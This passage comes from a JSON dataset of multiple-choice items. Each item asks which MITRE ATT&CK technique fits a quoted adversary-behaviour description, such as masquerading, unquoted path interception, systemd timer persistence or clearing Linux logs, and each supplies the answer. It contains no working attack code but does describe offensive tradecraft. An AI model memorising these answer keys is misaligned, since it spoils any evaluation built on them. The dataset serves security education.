      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. The technique occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.\n\nRenaming abusable system utilities to evade security monitoring is also a form of The technique.",
      "options": "A. Domain Trust Discovery, B. Masquerading, C. System Binary Proxy Execution: Regsvcs/Regasm, D. Shared Modules",
      "choice": "B. Masquerading",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may search social media for information about victims that can be used during targeting. Social media sites may contain various information about a victim organization, such as business announcements as well as information about the roles, locations, and interests of staff.\n\nAdversaries may search in different social media sites depending on what information they seek to gather. Threat actors may passively harvest data from these sites, as well as use information gathered to create fake profiles/groups to elicit victim\u2019s into revealing specific information (i.e. Spearphishing Service). Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Technical Databases), establishing operational resources (ex: Establish Accounts or Compromise Accounts), and/or initial access (ex: Spearphishing via Service).\nA. Input Capture: Web Portal Capture, B. Search Open Websites/Domains: Social Media, C. Build Image on Host, D. Event Triggered Execution: AppCert DLLs\nAnswer:",
    "context": "",
    "output": "B. Search Open Websites/Domains: Social Media",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may search social media for information about victims that can be used during targeting. Social media sites may contain various information about a victim organization, such as business announcements as well as information about the roles, locations, and interests of staff.\n\nAdversaries may search in different social media sites depending on what information they seek to gather. Threat actors may passively harvest data from these sites, as well as use information gathered to create fake profiles/groups to elicit victim\u2019s into revealing specific information (i.e. Spearphishing Service). Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Technical Databases), establishing operational resources (ex: Establish Accounts or Compromise Accounts), and/or initial access (ex: Spearphishing via Service).",
      "options": "A. Input Capture: Web Portal Capture, B. Search Open Websites/Domains: Social Media, C. Build Image on Host, D. Event Triggered Execution: AppCert DLLs",
      "choice": "B. Search Open Websites/Domains: Social Media",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may disable or modify a firewall within a cloud environment to bypass controls that limit access to cloud resources. Cloud firewalls are separate from system firewalls that are described in Disable or Modify System Firewall. \n\nCloud environments typically utilize restrictive security groups and firewall rules that only allow network activity from trusted IP addresses via expected ports and protocols. An adversary may introduce new firewall rules or policies to allow access into a victim cloud environment. For example, an adversary may use a script or utility that creates new ingress rules in existing security groups to allow any TCP/IP connectivity, or remove networking limitations to support traffic associated with malicious activity (such as cryptomining).\n\nModifying or disabling a cloud firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed.\nA. Traffic Signaling: Port Knocking, B. Search Open Websites/Domains: Search Engines, C. Unsecured Credentials: Bash History, D. Impair Defenses: Disable or Modify Cloud Firewall\nAnswer:",
    "context": "",
    "output": "D. Impair Defenses: Disable or Modify Cloud Firewall",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may disable or modify a firewall within a cloud environment to bypass controls that limit access to cloud resources. Cloud firewalls are separate from system firewalls that are described in Disable or Modify System Firewall. \n\nCloud environments typically utilize restrictive security groups and firewall rules that only allow network activity from trusted IP addresses via expected ports and protocols. An adversary may introduce new firewall rules or policies to allow access into a victim cloud environment. For example, an adversary may use a script or utility that creates new ingress rules in existing security groups to allow any TCP/IP connectivity, or remove networking limitations to support traffic associated with malicious activity (such as cryptomining).\n\nModifying or disabling a cloud firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed.",
      "options": "A. Traffic Signaling: Port Knocking, B. Search Open Websites/Domains: Search Engines, C. Unsecured Credentials: Bash History, D. Impair Defenses: Disable or Modify Cloud Firewall",
      "choice": "D. Impair Defenses: Disable or Modify Cloud Firewall",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may use voice communications to ultimately gain access to victim systems. Spearphishing voice is a specific variant of spearphishing. It is different from other forms of spearphishing in that is employs the use of manipulating a user into providing access to systems through a phone call or other forms of voice communications. Spearphishing frequently involves social engineering techniques, such as posing as a trusted source (ex: Impersonation) and/or creating a sense of urgency or alarm for the recipient.\n\nAll forms of phishing are electronically delivered social engineering. In this scenario, adversaries are not directly sending malware to a victim vice relying on User Execution for delivery and execution. For example, victims may receive phishing messages that instruct them to call a phone number where they are directed to visit a malicious URL, download malware, or install adversary-accessible remote management tools (Remote Access Software) onto their computer.\n\nAdversaries may also combine voice phishing with Multi-Factor Authentication Request Generation in order to trick users into divulging MFA credentials or accepting authentication prompts.\n\nA. Phishing: Spearphishing Voice, B. Office Application Startup: Office Test, C. Masquerading: Masquerade Task or Service, D. Virtualization/Sandbox Evasion: Time Based Evasion\nA:",
    "context": "",
    "output": "A. Phishing: Spearphishing Voice",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may use voice communications to ultimately gain access to victim systems. Spearphishing voice is a specific variant of spearphishing. It is different from other forms of spearphishing in that is employs the use of manipulating a user into providing access to systems through a phone call or other forms of voice communications. Spearphishing frequently involves social engineering techniques, such as posing as a trusted source (ex: Impersonation) and/or creating a sense of urgency or alarm for the recipient.\n\nAll forms of phishing are electronically delivered social engineering. In this scenario, adversaries are not directly sending malware to a victim vice relying on User Execution for delivery and execution. For example, victims may receive phishing messages that instruct them to call a phone number where they are directed to visit a malicious URL, download malware, or install adversary-accessible remote management tools (Remote Access Software) onto their computer.\n\nAdversaries may also combine voice phishing with Multi-Factor Authentication Request Generation in order to trick users into divulging MFA credentials or accepting authentication prompts.",
      "options": "A. Phishing: Spearphishing Voice, B. Office Application Startup: Office Test, C. Masquerading: Masquerade Task or Service, D. Virtualization/Sandbox Evasion: Time Based Evasion",
      "choice": "A. Phishing: Spearphishing Voice",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Which MITRE ATT&CK technique is described in the following:\nAdversaries may abuse Microsoft Outlook forms to obtain persistence on a compromised system. Outlook forms are used as templates for presentation and functionality in Outlook messages. Custom Outlook forms can be created that will execute code when a specifically crafted email is sent by an adversary utilizing the same custom Outlook form.\n\nOnce malicious forms have been added to the user\u2019s mailbox, they will be loaded when Outlook is started. Malicious forms will execute when an adversary sends a specifically crafted email to the user.\n\nA. Office Application Startup: Outlook Forms, B. Network Denial of Service: Direct Network Flood, C. XSL Script Processing, D. Non-Application Layer Protocol\nA:",
    "context": "",
    "output": "A. Office Application Startup: Outlook Forms",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may abuse Microsoft Outlook forms to obtain persistence on a compromised system. Outlook forms are used as templates for presentation and functionality in Outlook messages. Custom Outlook forms can be created that will execute code when a specifically crafted email is sent by an adversary utilizing the same custom Outlook form.\n\nOnce malicious forms have been added to the user\u2019s mailbox, they will be loaded when Outlook is started. Malicious forms will execute when an adversary sends a specifically crafted email to the user.",
      "options": "A. Office Application Startup: Outlook Forms, B. Network Denial of Service: Direct Network Flood, C. XSL Script Processing, D. Non-Application Layer Protocol",
      "choice": "A. Office Application Startup: Outlook Forms",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch.\n\nService paths  and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g., <code>C:\\unsafe path with space\\program.exe</code> vs. <code>\"C:\\safe path with space\\program.exe\"</code>).  (stored in Windows Registry keys) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is <code>C:\\program files\\myapp.exe</code>, an adversary may create a program at <code>C:\\program.exe</code> that will be run instead of the intended program.  \n\nThis technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.\n\nPossible answers:\nA. Impair Defenses: Indicator Blocking, B. Credentials from Password Stores: Keychain, C. Account Manipulation: Additional Container Cluster Roles, D. Hijack Execution Flow: Path Interception by Unquoted Path",
    "context": "",
    "output": "D. Hijack Execution Flow: Path Interception by Unquoted Path",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch.\n\nService paths  and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g., <code>C:\\unsafe path with space\\program.exe</code> vs. <code>\"C:\\safe path with space\\program.exe\"</code>).  (stored in Windows Registry keys) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is <code>C:\\program files\\myapp.exe</code>, an adversary may create a program at <code>C:\\program.exe</code> that will be run instead of the intended program.  \n\nThis technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.",
      "options": "A. Impair Defenses: Indicator Blocking, B. Credentials from Password Stores: Keychain, C. Account Manipulation: Additional Container Cluster Roles, D. Hijack Execution Flow: Path Interception by Unquoted Path",
      "choice": "D. Hijack Execution Flow: Path Interception by Unquoted Path",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Answer which mitre technique is related to the description: Adversaries may upload, install, or otherwise set up capabilities that can be used during targeting. To support their operations, an adversary may need to take capabilities they developed (Develop Capabilities) or obtained (Obtain Capabilities) and stage them on infrastructure under their control. These capabilities may be staged on infrastructure that was previously purchased/rented by the adversary (Acquire Infrastructure) or was otherwise compromised by them (Compromise Infrastructure). Capabilities may also be staged on web services, such as GitHub or Pastebin, or on Platform-as-a-Service (PaaS) offerings that enable users to easily provision applications.\n\nStaging of capabilities can aid the adversary in a number of initial access and post-compromise behaviors, including (but not limited to):\n\n* Staging web resources necessary to conduct Drive-by Compromise when a user browses to a site.\n* Staging web resources for a link target to be used with spearphishing.\n* Uploading malware or tools to a location accessible to a victim network to enable Ingress Tool Transfer.\n* Installing a previously acquired SSL/TLS certificate to use to encrypt command and control traffic (ex: Asymmetric Cryptography with Web Protocols).\n\nA. Template Injection, B. Modify Cloud Compute Infrastructure: Modify Cloud Compute Configurations, C. Stage Capabilities, D. Event Triggered Execution: Image File Execution Options Injection\nA:",
    "context": "",
    "output": "C. Stage Capabilities",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may upload, install, or otherwise set up capabilities that can be used during targeting. To support their operations, an adversary may need to take capabilities they developed (Develop Capabilities) or obtained (Obtain Capabilities) and stage them on infrastructure under their control. These capabilities may be staged on infrastructure that was previously purchased/rented by the adversary (Acquire Infrastructure) or was otherwise compromised by them (Compromise Infrastructure). Capabilities may also be staged on web services, such as GitHub or Pastebin, or on Platform-as-a-Service (PaaS) offerings that enable users to easily provision applications.\n\nStaging of capabilities can aid the adversary in a number of initial access and post-compromise behaviors, including (but not limited to):\n\n* Staging web resources necessary to conduct Drive-by Compromise when a user browses to a site.\n* Staging web resources for a link target to be used with spearphishing.\n* Uploading malware or tools to a location accessible to a victim network to enable Ingress Tool Transfer.\n* Installing a previously acquired SSL/TLS certificate to use to encrypt command and control traffic (ex: Asymmetric Cryptography with Web Protocols).",
      "options": "A. Template Injection, B. Modify Cloud Compute Infrastructure: Modify Cloud Compute Configurations, C. Stage Capabilities, D. Event Triggered Execution: Image File Execution Options Injection",
      "choice": "C. Stage Capabilities",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may register for web services\u00a0that can be used during targeting. A variety of popular websites exist for adversaries to register for a web-based service that can be abused during later stages of the adversary lifecycle, such as during Command and Control (Web Service), Exfiltration Over Web Service, or Phishing. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. By utilizing a web service, adversaries can make it difficult to physically tie back operations to them.\n\nA. Establish Accounts: Cloud Accounts, B. Acquire Infrastructure: Web Services, C. Boot or Logon Initialization Scripts: Login Hook, D. Impair Defenses: Disable Windows Event Logging\nA:",
    "context": "",
    "output": "B. Acquire Infrastructure: Web Services",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may register for web services\u00a0that can be used during targeting. A variety of popular websites exist for adversaries to register for a web-based service that can be abused during later stages of the adversary lifecycle, such as during Command and Control (Web Service), Exfiltration Over Web Service, or Phishing. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. By utilizing a web service, adversaries can make it difficult to physically tie back operations to them.",
      "options": "A. Establish Accounts: Cloud Accounts, B. Acquire Infrastructure: Web Services, C. Boot or Logon Initialization Scripts: Login Hook, D. Impair Defenses: Disable Windows Event Logging",
      "choice": "B. Acquire Infrastructure: Web Services",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may remove indicators from tools if they believe their malicious tool was detected, quarantined, or otherwise curtailed. They can modify the tool by removing the indicator and using the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems.\n\nA good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may modify the file to explicitly avoid that signature, and then re-use the malware.\nA. Event Triggered Execution, B. Obfuscated Files or Information: Indicator Removal from Tools, C. Event Triggered Execution: AppCert DLLs, D. Masquerading: Break Process Trees",
    "context": "",
    "output": "B. Obfuscated Files or Information: Indicator Removal from Tools",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may remove indicators from tools if they believe their malicious tool was detected, quarantined, or otherwise curtailed. They can modify the tool by removing the indicator and using the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems.\n\nA good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may modify the file to explicitly avoid that signature, and then re-use the malware.",
      "options": "A. Event Triggered Execution, B. Obfuscated Files or Information: Indicator Removal from Tools, C. Event Triggered Execution: AppCert DLLs, D. Masquerading: Break Process Trees",
      "choice": "B. Obfuscated Files or Information: Indicator Removal from Tools",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Which MITRE ATT&CK technique is described in the following:\nAdversaries can perform command and control between compromised hosts on potentially disconnected networks using removable media to transfer commands from system to system. Both systems would need to be compromised, with the likelihood that an Internet-connected system was compromised first and the second through lateral movement by Replication Through Removable Media. Commands and files would be relayed from the disconnected system to the Internet-connected system to which the adversary has direct access.\nA. System Network Configuration Discovery: Internet Connection Discovery, B. Communication Through Removable Media, C. OS Credential Dumping: /etc/passwd and /etc/shadow, D. Endpoint Denial of Service: Service Exhaustion Flood\nAnswer:",
    "context": "",
    "output": "B. Communication Through Removable Media",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries can perform command and control between compromised hosts on potentially disconnected networks using removable media to transfer commands from system to system. Both systems would need to be compromised, with the likelihood that an Internet-connected system was compromised first and the second through lateral movement by Replication Through Removable Media. Commands and files would be relayed from the disconnected system to the Internet-connected system to which the adversary has direct access.",
      "options": "A. System Network Configuration Discovery: Internet Connection Discovery, B. Communication Through Removable Media, C. OS Credential Dumping: /etc/passwd and /etc/shadow, D. Endpoint Denial of Service: Service Exhaustion Flood",
      "choice": "B. Communication Through Removable Media",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Answer which mitre technique is related to the description: An adversary with root access may gather credentials by reading `securityd`\u2019s memory. `securityd` is a service/daemon responsible for implementing security protocols such as encryption and authorization. A privileged adversary may be able to scan through `securityd`'s memory to find the correct sequence of keys to decrypt the user\u2019s logon keychain. This may provide the adversary with various plaintext passwords, such as those for users, WiFi, mail, browsers, certificates, secure notes, etc.\n\nIn OS X prior to El Capitan, users with root access can read plaintext keychain passwords of logged-in users because Apple\u2019s keychain implementation allows these credentials to be cached so that users are not repeatedly prompted for passwords. Apple\u2019s `securityd` utility takes the user\u2019s logon password, encrypts it with PBKDF2, and stores this master key in memory. Apple also uses a set of keys and algorithms to encrypt the user\u2019s password, but once the master key is found, an adversary need only iterate over the other values to unlock the final password.\nA. System Binary Proxy Execution: Mshta, B. Boot or Logon Autostart Execution: Time Providers, C. Gather Victim Identity Information, D. Credentials from Password Stores: Securityd Memory\nAnswer:",
    "context": "",
    "output": "D. Credentials from Password Stores: Securityd Memory",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: An adversary with root access may gather credentials by reading `securityd`\u2019s memory. `securityd` is a service/daemon responsible for implementing security protocols such as encryption and authorization. A privileged adversary may be able to scan through `securityd`'s memory to find the correct sequence of keys to decrypt the user\u2019s logon keychain. This may provide the adversary with various plaintext passwords, such as those for users, WiFi, mail, browsers, certificates, secure notes, etc.\n\nIn OS X prior to El Capitan, users with root access can read plaintext keychain passwords of logged-in users because Apple\u2019s keychain implementation allows these credentials to be cached so that users are not repeatedly prompted for passwords. Apple\u2019s `securityd` utility takes the user\u2019s logon password, encrypts it with PBKDF2, and stores this master key in memory. Apple also uses a set of keys and algorithms to encrypt the user\u2019s password, but once the master key is found, an adversary need only iterate over the other values to unlock the final password.",
      "options": "A. System Binary Proxy Execution: Mshta, B. Boot or Logon Autostart Execution: Time Providers, C. Gather Victim Identity Information, D. Credentials from Password Stores: Securityd Memory",
      "choice": "D. Credentials from Password Stores: Securityd Memory",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may create or modify container or container cluster management tools that run as daemons, agents, or services on individual hosts. These include software for creating and managing individual containers, such as Docker and Podman, as well as container cluster node-level agents such as kubelet. By modifying these services, an adversary may be able to achieve persistence or escalate their privileges on a host.\n\nFor example, by using the `docker run` or `podman run` command with the `restart=always` directive, a container can be configured to persistently restart on the host. A user with access to the (rootful) docker command may also be able to escalate their privileges on the host.\n\nIn Kubernetes environments, DaemonSets allow an adversary to persistently Deploy Containers on all nodes, including ones added later to the cluster. Pods can also be deployed to specific nodes using the `nodeSelector` or `nodeName` fields in the pod spec.\n\nNote that containers can also be configured to run as Systemd Services.\n\nPossible answers:\nA. Scheduled Task/Job: Cron, B. Create or Modify System Process: Container Service, C. Execution Guardrails, D. Endpoint Denial of Service: Service Exhaustion Flood",
    "context": "",
    "output": "B. Create or Modify System Process: Container Service",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may create or modify container or container cluster management tools that run as daemons, agents, or services on individual hosts. These include software for creating and managing individual containers, such as Docker and Podman, as well as container cluster node-level agents such as kubelet. By modifying these services, an adversary may be able to achieve persistence or escalate their privileges on a host.\n\nFor example, by using the `docker run` or `podman run` command with the `restart=always` directive, a container can be configured to persistently restart on the host. A user with access to the (rootful) docker command may also be able to escalate their privileges on the host.\n\nIn Kubernetes environments, DaemonSets allow an adversary to persistently Deploy Containers on all nodes, including ones added later to the cluster. Pods can also be deployed to specific nodes using the `nodeSelector` or `nodeName` fields in the pod spec.\n\nNote that containers can also be configured to run as Systemd Services.",
      "options": "A. Scheduled Task/Job: Cron, B. Create or Modify System Process: Container Service, C. Execution Guardrails, D. Endpoint Denial of Service: Service Exhaustion Flood",
      "choice": "B. Create or Modify System Process: Container Service",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may gather information about the victim's client configurations that can be used during targeting. Information about client configurations may include a variety of details and settings, including operating system/version, virtualization, architecture (ex: 32 or 64 bit), language, and/or time zone.\n\nAdversaries may gather this information in various ways, such as direct collection actions via Active Scanning (ex: listening ports, server banners, user agent strings) or Phishing for Information. Adversaries may also compromise sites then include malicious content designed to collect host information from visitors. Information about the client configurations may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Search Open Technical Databases), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: Supply Chain Compromise or External Remote Services).\n\nA. Gather Victim Host Information: Client Configurations, B. Hide Artifacts, C. Forge Web Credentials: SAML Tokens, D. Virtualization/Sandbox Evasion: System Checks\nA:",
    "context": "",
    "output": "A. Gather Victim Host Information: Client Configurations",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may gather information about the victim's client configurations that can be used during targeting. Information about client configurations may include a variety of details and settings, including operating system/version, virtualization, architecture (ex: 32 or 64 bit), language, and/or time zone.\n\nAdversaries may gather this information in various ways, such as direct collection actions via Active Scanning (ex: listening ports, server banners, user agent strings) or Phishing for Information. Adversaries may also compromise sites then include malicious content designed to collect host information from visitors. Information about the client configurations may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Search Open Technical Databases), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: Supply Chain Compromise or External Remote Services).",
      "options": "A. Gather Victim Host Information: Client Configurations, B. Hide Artifacts, C. Forge Web Credentials: SAML Tokens, D. Virtualization/Sandbox Evasion: System Checks",
      "choice": "A. Gather Victim Host Information: Client Configurations",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Answer which mitre technique is related to the description: Adversaries may abuse systemd timers to perform task scheduling for initial or recurring execution of malicious code. Systemd timers are unit files with file extension <code>.timer</code> that control services. Timers can be set to run on a calendar event or after a time span relative to a starting point. They can be used as an alternative to Cron in Linux environments. Systemd timers may be activated remotely via the <code>systemctl</code> command line utility, which operates over SSH.\n\nEach <code>.timer</code> file must have a corresponding <code>.service</code> file with the same name, e.g., <code>example.timer</code> and <code>example.service</code>. <code>.service</code> files are Systemd Service unit files that are managed by the systemd system and service manager. Privileged timers are written to <code>/etc/systemd/system/</code> and <code>/usr/lib/systemd/system</code> while user level are written to <code>~/.config/systemd/user/</code>.\n\nAn adversary may use systemd timers to execute malicious code at system startup or on a scheduled basis for persistence. Timers installed using privileged paths may be used to maintain root level persistence. Adversaries may also install user level timers to achieve user level persistence.\nA. Obfuscated Files or Information: Stripped Payloads, B. Unsecured Credentials: Private Keys, C. Search Open Websites/Domains, D. Scheduled Task/Job: Systemd Timers\nAnswer:",
    "context": "",
    "output": "D. Scheduled Task/Job: Systemd Timers",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may abuse systemd timers to perform task scheduling for initial or recurring execution of malicious code. Systemd timers are unit files with file extension <code>.timer</code> that control services. Timers can be set to run on a calendar event or after a time span relative to a starting point. They can be used as an alternative to Cron in Linux environments. Systemd timers may be activated remotely via the <code>systemctl</code> command line utility, which operates over SSH.\n\nEach <code>.timer</code> file must have a corresponding <code>.service</code> file with the same name, e.g., <code>example.timer</code> and <code>example.service</code>. <code>.service</code> files are Systemd Service unit files that are managed by the systemd system and service manager. Privileged timers are written to <code>/etc/systemd/system/</code> and <code>/usr/lib/systemd/system</code> while user level are written to <code>~/.config/systemd/user/</code>.\n\nAn adversary may use systemd timers to execute malicious code at system startup or on a scheduled basis for persistence. Timers installed using privileged paths may be used to maintain root level persistence. Adversaries may also install user level timers to achieve user level persistence.",
      "options": "A. Obfuscated Files or Information: Stripped Payloads, B. Unsecured Credentials: Private Keys, C. Search Open Websites/Domains, D. Scheduled Task/Job: Systemd Timers",
      "choice": "D. Scheduled Task/Job: Systemd Timers",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n\nA. Protocol Tunneling, B. Modify System Image: Patch System Image, C. Indicator Removal: Clear Linux or Mac System Logs, D. Active Scanning\nAnswer:",
    "context": "",
    "output": "C. Indicator Removal: Clear Linux or Mac System Logs",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs",
      "options": "A. Protocol Tunneling, B. Modify System Image: Patch System Image, C. Indicator Removal: Clear Linux or Mac System Logs, D. Active Scanning",
      "choice": "C. Indicator Removal: Clear Linux or Mac System Logs",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Which MITRE ATT&CK technique is described in the following:\nAdversaries may create accounts with cloud providers that can be used during targeting. Adversaries can use cloud accounts to further their operations, including leveraging cloud storage services such as Dropbox, MEGA, Microsoft OneDrive, or AWS S3 buckets for Exfiltration to Cloud Storage or to Upload Tools. Cloud accounts can also be used in the acquisition of infrastructure, such as Virtual Private Servers or Serverless infrastructure. Establishing cloud accounts may allow adversaries to develop sophisticated capabilities without managing their own servers.\n\nCreating Cloud Accounts may also require adversaries to establish Email Accounts to register with the cloud provider.\n\nA. Hijack Execution Flow: AppDomainManager, B. Scheduled Task/Job: Container Orchestration Job, C. Establish Accounts: Cloud Accounts, D. Process Injection: Asynchronous Procedure Call\nA:",
    "context": "",
    "output": "C. Establish Accounts: Cloud Accounts",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may create accounts with cloud providers that can be used during targeting. Adversaries can use cloud accounts to further their operations, including leveraging cloud storage services such as Dropbox, MEGA, Microsoft OneDrive, or AWS S3 buckets for Exfiltration to Cloud Storage or to Upload Tools. Cloud accounts can also be used in the acquisition of infrastructure, such as Virtual Private Servers or Serverless infrastructure. Establishing cloud accounts may allow adversaries to develop sophisticated capabilities without managing their own servers.\n\nCreating Cloud Accounts may also require adversaries to establish Email Accounts to register with the cloud provider.",
      "options": "A. Hijack Execution Flow: AppDomainManager, B. Scheduled Task/Job: Container Orchestration Job, C. Establish Accounts: Cloud Accounts, D. Process Injection: Asynchronous Procedure Call",
      "choice": "C. Establish Accounts: Cloud Accounts",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
